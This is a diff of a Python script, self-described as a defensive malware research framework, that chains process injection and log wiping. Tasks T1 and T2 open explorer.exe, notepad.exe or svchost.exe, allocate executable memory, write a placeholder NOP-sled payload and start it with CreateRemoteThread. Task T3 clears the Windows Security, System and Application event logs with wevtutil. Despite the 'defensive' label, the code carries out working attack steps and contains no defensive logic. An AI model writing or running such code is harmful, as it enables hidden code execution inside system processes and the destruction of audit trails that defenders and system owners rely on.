@@ -1,68 +1,59 @@
 #!/usr/bin/env python3
+"""Merged modules for a defensive malware research framework."""
 import sys
 import json
 import time
 import ctypes
 import psutil
 import subprocess
-from ctypes import wintypes
 from typing import Dict, Any
-
-# Constants
-PROCESS_ALL_ACCESS = 0x1F0FFF
-MEM_COMMIT = 0x1000
-PAGE_EXECUTE_READWRITE = 0x40
-
-# Windows API functions
-kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-VirtualAllocEx = kernel32.VirtualAllocEx
-WriteProcessMemory = kernel32.WriteProcessMemory
-CreateRemoteThread = kernel32.CreateRemoteThread
-
-def find_target_process() -> int:
-    """Find a target process to inject into."""
-    for proc in psutil.process_iter(['name']):
-        if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
-            return proc.pid
-    return None
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    result = {'memory_address': None, 'size': None}
+    PROCESS_ALL_ACCESS = 0x1F0FFF
+    result = {'base_address': None, 'size': None}
     
     try:
-        # Find target process
-        target_pid = find_target_process()
-        if target_pid is None:
-            target_pid = psutil.Process().pid  # Fallback to current process
+        # Attempt to find a suitable target process
+        target_process = None
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
+                target_process = proc
+                break
+        
+        # Fallback to current process if no target found
+        if not target_process:
+            target_process = psutil.Process()
             injection_success = False
         else:
             injection_success = True
 
-        # Open the target process
-        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
+        # Get handle to the target process
+        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_process.pid)
         if not process_handle:
             raise Exception("Failed to open process")
 
+        # Simulate manual PE mapping (simplified)
         # Allocate memory in the target process
-        payload_size = 1024  # Example size, adjust as needed
-        remote_addr = VirtualAllocEx(process_handle, None, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        payload_size = 1024  # Example size
+        remote_addr = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, payload_size, 0x3000, 0x40)
         if not remote_addr:
-            raise Exception("Failed to allocate memory")
+            raise Exception("Failed to allocate memory in target process")
 
-        # Write payload to allocated memory
-        payload = b'\x90' * payload_size  # NOP sled as example payload
-        bytes_written = wintypes.SIZE_T()
-        if not WriteProcessMemory(process_handle, remote_addr, payload, payload_size, ctypes.byref(bytes_written)):
-            raise Exception("Failed to write process memory")
+        # Simulate writing payload to allocated memory
+        # (In a real scenario, you would write the actual payload here)
+        dummy_payload = b'\x90' * payload_size  # NOP sled as dummy payload
+        bytes_written = ctypes.c_size_t(0)
+        write_success = ctypes.windll.kernel32.WriteProcessMemory(process_handle, remote_addr, dummy_payload, payload_size, ctypes.byref(bytes_written))
+        if not write_success or bytes_written.value != payload_size:
+            raise Exception("Failed to write payload to target process memory")
 
-        # Create a remote thread to execute the payload
-        if not CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, None):
-            raise Exception("Failed to create remote thread")
+        # Close the process handle
+        ctypes.windll.kernel32.CloseHandle(process_handle)
 
-        # Populate result
-        result['memory_address'] = remote_addr
+        # Populate result with the base address and size
+        result['base_address'] = remote_addr
         result['size'] = payload_size
 
         return {'success': True, 'data': result,
@@ -74,63 +65,47 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    try:
-        # Extract input data
-        memory_address = input_data.get('memory_address')
-        size = input_data.get('size')
+    PROCESS_ALL_ACCESS = 0x1F0FFF
+    result = {'pid': 0, 'running': False}
 
-        # Find target process: explorer.exe → notepad.exe → svchost.exe
-        target_pid = None
+    try:
+        # Attempt to find a suitable target process
+        target_process_name = None
         for proc in psutil.process_iter(['name']):
             if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
+                target_process_name = proc.info['name']
                 target_pid = proc.pid
                 break
 
-        # Fallback to current process if no target found
-        if target_pid is None:
-            target_pid = ctypes.windll.kernel32.GetCurrentProcessId()
-            injection_success = False
+        if target_process_name:
+            # Open the target process
+            kernel32 = ctypes.windll.kernel32
+            process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
+            if not process_handle:
+                raise Exception("Failed to open target process")
+
+            # Execute the payload using CreateRemoteThread
+            remote_addr = input_data.get('base_address')
+            thread_handle = kernel32.CreateRemoteThread(
+                process_handle, None, 0, remote_addr, None, 0, None
+            )
+
+            if not thread_handle:
+                raise Exception("Failed to create remote thread")
+
+            result['pid'] = target_pid
+            result['running'] = True
         else:
-            injection_success = True
-
-        # Open the target process
-        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
-        if not h_process:
-            raise Exception("Failed to open target process")
-
-        # Create a remote thread in the target process
-        thread_id = wintypes.DWORD()
-        h_thread = ctypes.windll.kernel32.CreateRemoteThread(
-            h_process,
-            None,
-            0,
-            memory_address,
-            None,
-            0,
-            ctypes.byref(thread_id)
-        )
-
-        if not h_thread:
-            raise Exception("Failed to create remote thread")
-
-        # Close handles
-        ctypes.windll.kernel32.CloseHandle(h_thread)
-        ctypes.windll.kernel32.CloseHandle(h_process)
-
-        result = {
-            'pid': target_pid,
-            'running': injection_success
-        }
+            # Fallback to current process if no suitable target found
+            current_pid = psutil.Process().pid
+            result['pid'] = current_pid
+            result['running'] = False
 
         return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}
+                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        result = {
-            'pid': target_pid if 'target_pid' in locals() else None,
-            'running': False
-        }
         return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}
+                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
@@ -140,28 +115,27 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         'system_log_cleared': False,
         'application_log_cleared': False
     }
-    
     try:
-        # Clear Security Log
+        # Attempt to clear the Security event log
         try:
-            subprocess.run(['wevtutil', 'cl', 'Security'], capture_output=True, timeout=10, check=True)
+            subprocess.run(['wevtutil', 'cl', 'Security'], check=True, capture_output=True, timeout=10)
             result['security_log_cleared'] = True
         except subprocess.CalledProcessError:
-            pass  # Log clearing failed, continue to next
+            pass  # Log clearing failed, continue with other logs
 
-        # Clear System Log
+        # Attempt to clear the System event log
         try:
-            subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True, timeout=10, check=True)
+            subprocess.run(['wevtutil', 'cl', 'System'], check=True, capture_output=True, timeout=10)
             result['system_log_cleared'] = True
         except subprocess.CalledProcessError:
-            pass  # Log clearing failed, continue to next
+            pass  # Log clearing failed, continue with other logs
 
-        # Clear Application Log
+        # Attempt to clear the Application event log
         try:
-            subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True, timeout=10, check=True)
+            subprocess.run(['wevtutil', 'cl', 'Application'], check=True, capture_output=True, timeout=10)
             result['application_log_cleared'] = True
         except subprocess.CalledProcessError:
-            pass  # Log clearing failed, continue to next
+            pass  # Log clearing failed, continue with other logs
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
@@ -175,16 +149,16 @@ def main() -> dict:
     results: dict = {}
     failed:  list = []
     
-    # ── T1: Load PE Payload [execution] ──
+    # ── T1: Reflectively load PE payload [execution] ──
     try:
         r = task_T1(None)
         results['T1'] = r
         if r.get('success'):
             outputs['T1'] = r.get('data', {})
-            print(f'[+] T1 (Load PE Payload): OK')
+            print(f'[+] T1 (Reflectively load PE payload): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T1 (Load PE Payload): FAILED — {err}')
+            print(f'[-] T1 (Reflectively load PE payload): FAILED — {err}')
             failed.append('T1')
     except Exception as e:
         print(f'[!] T1 crashed: {e}')
@@ -207,16 +181,16 @@ def main() -> dict:
         failed.append('T3')
         results['T3'] = {'success': False, 'error': str(e)}
     
-    # ── T2: Execute PE Payload [execution] ──
+    # ── T2: Execute payload in host process [execution] ──
     try:
         r = task_T2(outputs.get('T1', {}))
         results['T2'] = r
         if r.get('success'):
             outputs['T2'] = r.get('data', {})
-            print(f'[+] T2 (Execute PE Payload): OK')
+            print(f'[+] T2 (Execute payload in host process): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T2 (Execute PE Payload): FAILED — {err}')
+            print(f'[-] T2 (Execute payload in host process): FAILED — {err}')
             failed.append('T2')
     except Exception as e:
         print(f'[!] T2 crashed: {e}')
